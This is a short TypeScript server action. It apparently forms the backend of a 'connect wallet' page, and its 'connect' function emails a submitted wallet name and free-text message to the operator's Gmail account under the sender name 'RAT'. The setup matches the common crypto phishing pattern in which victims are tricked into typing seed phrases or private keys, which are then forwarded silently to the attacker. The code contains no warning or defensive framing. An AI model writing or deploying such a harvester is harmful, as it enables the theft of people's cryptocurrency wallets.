"use server";

import nodemailer from "nodemailer";

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true, // 
  auth: {
    user: process.env.GMAIL_USER, 
    pass: process.env.GMAIL_PASS, 
  },
});

export async function connect(walletName: string, message: string) {
   console.log(process.env.GMAIL_USER)
  try {
    await transporter.sendMail({
      from: `"RAT"`,
      to: process.env.GMAIL_USER,
      subject: `New Wallet $RAT: ${walletName}`,
      text: `Message: ${message}`,
    });

    console.log("Email sent successfully!");
  } catch (error) {
    console.error("Error sending email:", error);
    throw new Error("Failed to send email.");
  }
}
